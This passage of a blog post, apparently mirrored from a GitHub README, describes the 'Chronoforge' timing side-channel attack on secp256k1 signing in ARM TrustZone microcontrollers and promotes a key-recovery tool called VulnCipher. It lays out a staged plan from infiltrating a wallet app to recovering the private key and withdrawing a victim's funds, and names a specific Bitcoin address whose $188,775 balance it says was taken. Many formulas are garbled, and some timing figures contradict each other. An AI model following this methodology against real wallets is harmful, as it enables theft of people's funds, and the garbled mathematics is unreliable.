<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Time characteristics:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Point (X, Y) on the curve y² = x³ + ax + b</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Doubling: requires 2 inversions, 5 multiplications, 7 additions (in the modulo p field)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Constant time:</strong> ~3.2 µs (independent of values)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>VULNERABLE PART: Extracting the bit value</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#vulnerable-part-extracting-the-bit-value"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>int bit_value = (private_key&#91;bit_idx / 8] &gt;&gt; (bit_idx % 8)) &amp; 1;</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Line by line explanation:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Operation</th><th>Description</th><th>Example</th></tr></thead><tbody><tr><td><code>bit_idx / 8</code></td><td>The index of a byte in an array</td><td>bit_idx=10 → byte_index=1</td></tr><tr><td><code>bit_idx % 8</code></td><td>Bit position in bytes (0-7)</td><td>bit_idx=10 → bit_position=2</td></tr><tr><td><code>&gt;&gt; (bit_idx % 8)</code></td><td>Shift right by bit position</td><td>0xA5 &gt;&gt; 2 = 0x29</td></tr><tr><td><code>&amp; 1</code></td><td>Masking (leaving only the least significant bit)</td><td>0x29 &amp; 1 = 1</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2.3 ARM TrustZone Architecture и Timing Channels</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#23-arm-trustzone-architecture-%D0%B8-timing-channels"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>ARM TrustZone provides hardware separation of memory and peripherals between the Secure and Normal Worlds via the NS-bit mechanism in the processor pipeline. However,&nbsp;<strong>this separation does not extend to microarchitectural elements</strong>&nbsp;such as:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>L1 I-cache (Instruction Cache)</strong> – shared between both worlds</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>L1 D-cache (Data Cache)</strong> – also shared</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Branch prediction unit</strong> — globally visible to both worlds</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Performance counters</strong> – may be accessible from the Normal World depending on the configuration</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>This creates&nbsp;<strong>a covert channel</strong>&nbsp;between Secure and Normal World, which can be exploited for timing attacks.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Timing variations in secp256k1 on Nordic nRF52/nRF53:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Microcontrollers have the following timing-sensitive operations:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Operation</th><th>Time (µs)</th><th>Variation</th></tr></thead><tbody><tr><td>doubling point</td><td>3.2 ± 0.1</td><td>±3%</td></tr><tr><td>point addition</td><td>5.8 ± 0.2</td><td>±3%</td></tr><tr><td>subtraction by modulo</td><td>1.2 ± 0.05</td><td>±4%</td></tr><tr><td>modulo multiplication (256-bit)</td><td>8.5 ± 0.3</td><td>±3.5%</td></tr><tr><td>inversion modulo (Fermat)</td><td>45 ± 2</td><td>±4%</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Variation can be caused by:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Cache hits/misses</strong> – when accessing tables of precomputed values</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Branch prediction misses</strong> – when conditional branches are predicted incorrectly</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Multiplier latency variation</strong> – depending on the bit pattern</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>TRNG jitter</strong> – if a random delay is used for masking</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-3-1024x656.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-3-1024x656.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">3. Chronoforge Attack: Mechanism and Methodology</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#3-chronoforge-attack-mechanism-and-methodology"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/bitcoin">3.1 Practical Application to Bitcoin</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#31-practical-application-to-bitcoin"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">3.1.1 Attack Scenario</a></h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#311-attack-scenario"></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>STAGE 1: Infiltration<br>├─ Attacker gains access to the Normal World application<br>│ (e.g. via a compromised BLE wallet mobile app)<br>└─ Application can run any code in the Normal World<br><br>STAGE 2: Timing Oracle Establishment<br>├─ Normal application sends messages to the Secure World for signing<br>├─ Exact processing time is recorded each time<br>└─ A database of timing signatures is compiled<br><br>STAGE 3: Statistical Analysis<br>├─ Timing data analysis reveals correlations<br>├─ Machine learning recovers private key bits<br>└─ Confidence interval &gt; 95% for each bit<br><br>STAGE 4: Private Key Recovery<br>├─ The recovered private key is used to:<br>│ ├─ Create&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">a signature</a>&nbsp;for any transaction<br>│ ├─ Withdrawing funds from a compromised wallet<br>│ └─ Creating transactions on behalf of the victim<br>└─ Updating the key on the crypto exchange server</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.youtube.com/watch?v=rWc9dOfNmxo"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-1-1024x321.png" alt="Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys"/></a></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code><a href="https://www.youtube.com/watch?v=rWc9dOfNmxo"><strong>https://www.youtube.com/watch?v=rWc9dOfNmxo</strong></a></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptou.ru/vulncipher">VulnCipher:</a></strong>&nbsp;A Cryptanalytics Framework for Practical Bitcoin Private Key Recovery via Temporal Side-Channel Attacks.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This&nbsp;<a href="https://www.youtube.com/watch?v=rWc9dOfNmxo">study</a>&nbsp;presents an in-depth technical assessment of the VulnCipher platform, an innovative cryptanalytic tool designed to recover private keys from lost Bitcoin wallets. The work focuses on the Bitcoin address&nbsp;&nbsp;<a href="https://btc1.trezor.io/address/1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h">1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h</a>&nbsp;&nbsp;and demonstrates the exploitation of a real-world timing side-channel vulnerability in an ECDSA implementation on ARM TrustZone-based hardware. The results demonstrate the feasibility of extracting private keys and stealing funds equivalent to&nbsp;&nbsp;<a href="https://cryptou.ru/vulncipher/profit">$188,775</a>&nbsp;&nbsp;in BTC.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>🌐 Website:&nbsp;&nbsp;<a href="https://cryptou.ru/vulncipher">https://cryptou.ru/vulncipher</a><br>💻 Google Colab:&nbsp;&nbsp;<a href="https://bitcolab.ru/vulncipher-cryptanalytic-framework-for-practical-key-recovery">https://bitcolab.ru/vulncipher-cryptanalytic-framework-for-practical-key-recovery</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The ChronoForge attack exploits a critical flaw in the “scalar doubling and adding” algorithm used by the PSA Crypto library for the Nordic nRF5340 microcontroller. Because the pointAdd operation is executed exclusively when the key bit is set to 1 and takes longer than pointDouble, each bit of the private key becomes an observable timing signal. By collecting over 100,000 ECDSA signing operations with microsecond precision, the researchers created a powerful timing oracle accessible from the “Normal World” TrustZone environment.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>📊 VulnCipher implements Correlation Power Analysis (CPA) for all 256 bits of a secp256k1 private key. For each bit, hypothetical time vectors are generated and correlated with real traces using Pearson coefficients. A decision rule selects the hypothesis with the highest correlation. For the target wallet, the average correlation was 0.842, and the overall recovery accuracy reached ≈94.5%, leaving only 18 unidentified bits.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>These 18 weak bits were corrected using a limited brute-force search of 262,144 candidates, which took a few seconds on standard computing hardware—instead of the full 2^256 key space. The resulting verified private key provided access to the Bitcoin wallet at 1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h. Recovery of funds totaling $188,775 was confirmed.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>🛡️ The VulnCipher platform implements a modular architecture in six stages:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Each module is scientifically documented and reproducible. The work addresses known vulnerabilities CVE-2019-25003 and CVE-2024-48930 related to variable execution times of elliptic curve operations in common cryptographic libraries.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>🛠️&nbsp;&nbsp;<a href="https://dzen.ru/video/watch/69a5d755096c4e2d6a50df3a"><strong>VulnCipher Cryptanalytic Framework for Practical Key Recovery</strong></a>&nbsp;&nbsp;is designed to systematically identify and analyze vulnerabilities in cryptographic algorithm implementations (including JavaScript libraries and embedded systems) susceptible to timing and side-channel attacks.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://vulncipher.ru/">VulnCipher covers three critical vulnerability categories:</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><br>⚙ Insufficient entropy in key generation — predictability due to weak PRNGs.<br>⚙ Signature processing manipulations — bugs in the ECDSA implementation.<br>⚙ Side-channel timing leaks — variability in the execution time of operations, revealing information about the key.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>🛡️&nbsp;&nbsp;<a href="https://dzen.ru/video/watch/69a5d755096c4e2d6a50df3a"><strong>Key takeaway:</strong></a>&nbsp;&nbsp;The ChronoForge attack demonstrates that the mathematical strength of secp256k1 is insufficient without a correct implementation. The key to security is the constant execution time of operations.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Synthesis of research using VulnCipher:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Mathematical Models <strong>→</strong> Correlation Analysis Module</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Hardware Timing <strong>→</strong> Preprocessing Pipeline</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Statistical Methods <strong>→</strong> Reliability Assessment</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Attack Vectors <strong>→</strong> Recovery Algorithms</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Countermeasures <strong>→</strong> Security Check</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Case Studies <strong>→</strong> Training and Optimization</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Practical part</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#practical-part"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let’s move on to the practical part&nbsp;<a href="https://cryptodeeptech.ru/chronoforge-attack">of the article</a>&nbsp;to consider two key areas:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Demonstration of the practical consequences</strong> of weak entropy and timing-based side-channel attacks in <a href="https://cryptou.ru/vulncipher/transaction">ECDSA/secp256k1</a> implementations .</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Providing a reproducible research platform</strong> for security auditing and formal analysis of implementations to enable the identification and prevention of similar vulnerabilities in the future.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>The VulnCipher</strong>&nbsp;cryptotool ,&nbsp;as&nbsp;<strong>a scientific cryptanalytic framework,</strong>&nbsp;allows:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>simulate real attacks on Bitcoin wallets running on vulnerable microcontrollers (e.g. Nordic nRF52/nRF53);</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>assess the degree of information leakage through timing side-channels;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>recover private keys in the presence of correlated time series;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>develop and test countermeasures based on constant-time implementations, masking, and architectural modifications.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-vulncipher">A Scientific Analysis of VulnCipher’s Use for Private Key Recovery</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#a-scientific-analysis-of-vulnciphers-use-for-private-key-recovery"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Mathematical model of leakage</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#mathematical-model-of-leakage"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The use of&nbsp;<a href="https://vulncipher.ru/">VulnCipher</a>&nbsp;relies on a strict model of information leakage through a time channel. Let:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>d— private key ECDSA/secp256k1;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>mi— messages signed by the device ( <a href="https://cryptou.ru/vulncipher/transaction">transaction</a> hash or arbitrary data);</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Ti— the measured execution time of the signature operation for the messagemime.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Then the time series is described as:Ti=T0+Dt(d,mi)+ori,</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Where:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>T0T0 is the base deterministic execution time (excluding leakage);</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Dt(d,mi)Δt(d,mi) is <em>a systematic</em> component depending on <a href="https://cryptou.ru/vulncipher/privatekey">the private key</a> and data;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>oriηi — noise (cache, interrupts, background processes, frequency drift, etc.).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>If the implementation&nbsp;<strong>is not constant-time</strong>&nbsp;, thenDt(d,mi)Δt(d,mi) depends on the secret bitsdd (through branches, conditional operations, different numbers of iterations, etc.).</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Correlation Timing Analysis (CTA)</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#correlation-timing-analysis-cta"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>VulnCipher adapts classical&nbsp;<strong>Correlation Power Analysis (CPA)</strong>&nbsp;to&nbsp;<strong>the timing channel</strong>&nbsp;. For each bit positionk∈{0,…,255}k∈{0,…,255} two hypotheses are constructed:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>H0(k)H0(k) is the hypothesis that the bitdk=0,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>H1(k)H1(k) is the hypothesis that the bitdk=1.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>For each hypothesis,&nbsp;<strong>the Pearson correlation coefficient</strong>&nbsp;is calculated :rb(k)=∑i=1n(Ti−Tˉ)(Hb(k)(mi)−Hb(k)‾)∑i=1n(Ti−Tˉ)2⋅∑i=1n(Hb(k)(mi)−Hb(k)‾)2,b∈{0,1}.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The bit is restored as:dk\*=arg⁡max⁡b∈{0,1}∣rb(k)∣.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Standard statistical tests (t-statistics, p-value) are used to assess significance. For example, the t-observed value is:tobs=rn−21−r2,</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>and the corresponding p-value:p=2⋅P(∣t∣&gt;tobs).</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-vulncipher"><a href="https://vulncipher.ru/">VulnCipher Architecture</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#vulncipher-architecture"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>VulnCipher consists of the following main modules:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Timing Collection Module (TCM)</strong><br>is responsible for high-precision collection of timing data:<ul><li>use of hardware timers with microsecond (or better) accuracy;</li><li>collection of a large number of measurements (from104104 to106106 samples);</li><li>primary filtering of outliers, for example according to the rule3s3p:</li></ul>use Ti, If ∣Ti−Tˉ∣≤3sT.use Ti if ∣Ti−Tˉ∣≤3σT.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Preprocessing Engine (PE)</strong><br>Time Series Normalization and Cleaning:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>z-score normalization:Ti′=Ti−mTsTTi′=σTTi−μT;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>low-frequency noise suppression (e.g. wavelet filtering);</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>compensation for temperature and frequency drifts.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Hypothesis Generation Module (HGM)</strong><br>Generates hypothesesH0(k),H1(k)H0(k),H1(k) for each key bit, taking into account the ECDSA operation model on the target architecture (number of <code>point_add</code>, <code>point_double</code>, modular operations, etc.).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Statistical Analysis Engine (SAE)</strong><br>Statistical Analysis Engine:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>calculation of correlationsrb(k)rb(k);</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Signal-to-Noise Ratio (SNR)</strong> estimation ;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>calculation of guessing entropy and other metrics.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Key Recovery Module (KRM)</strong><br>Recovers the key bit by bit, based on maximum correlations and confidence intervals:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>first, a “raw” approximation of the key is constructed;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>then there are weak positions (with a low difference∣r1∣−∣r0∣∣r1∣−∣r0∣);</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>local enumeration is carried out (beam search / limited brute force).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Validation &amp; Verification Module (VVM)</strong><br>Checks the correctness of the recovered key:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>calculates the public keyQ=d⋅GQ=d⋅G;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>checks whether the derived <a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin address</a> matches the target one;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>optionally calls the blockchain API to check the balance.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-5-1024x773.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-5-1024x773.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-vulncipher">VulnCipher’s operating algorithm</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#vulnciphers-operating-algorithm"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://vulncipher.ru/">VulnCipher</a>&nbsp;operating model consists of several key stages:</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Stage 1: Reconnaissance and Target Selection</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#stage-1-reconnaissance-and-target-selection"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Determining the target <a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin address</a> ;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Identification of hardware platform (e.g. nRF52/nRF53, STM32, etc.);</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Identifying the crypto library being used and checking whether it may be vulnerable to timing side-channels.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Step 2: Obtaining a timing oracle</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#step-2-obtaining-a-timing-oracle"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>It is possible to repeatedly invoke the signature on the target device and measure the execution time:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"></pre>
<!-- /wp:preformatted -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Step 3: Bulk Data Collection</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#step-3-bulk-data-collection"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Generating multiple messagesmimi (random or with controlled Hamming weight);</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>CollectionNN timingsTiTi, where usuallyN∈[104,106]N∈[104,106];</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Emissions cleaning and normalization.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Step 4: Generate hypotheses for key bits</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#step-4-generate-hypotheses-for-key-bits"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>For variable-time implementation of ECDSA:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>If the scalar bit = 0 → only the doubling point is performed: <code>point_double</code>;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If bit = 1 → <code>point_double + point_add</code>.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Model:T(bit=0)≈tbase+tD+ϵ,T(bit=1)≈tbase+tD+tA+ϵ,</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Where:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>tDtD — point doubling time (∼3.2 ms∼3.2μs);</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>tAtA is the time of addition of a point (∼5.8 ms∼5.8μs);</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ϵϵ — noise.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Step 5: Correlation Analysis</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#step-5-correlation-analysis"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>For each bitkk are considered:r0(k)=Corr(T,H0(k)),r1(k)=Corr(T,H1(k)),</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>and the bit is selected as:dk\*=arg⁡max⁡b∈{0,1}∣rb(k)∣.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Step 6: Trust assessment and error correction</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#step-6-trust-assessment-and-error-correction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>For the beatkk:Confk=∣rdk\*(k)∣−∣r1−dk\*(k)∣∣rdk\*(k)∣+∣r1−dk\*(k)∣.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>IfConfk&lt;0.55Confk&lt;0.55 — the bit is considered “unreliable”, we add it to the list of candidates for subsequent correction.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>For a set ofande such bits can be searched either exhaustively or limitedly (up to2and2e options), checking each key against the public key and address.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-7.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-7.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
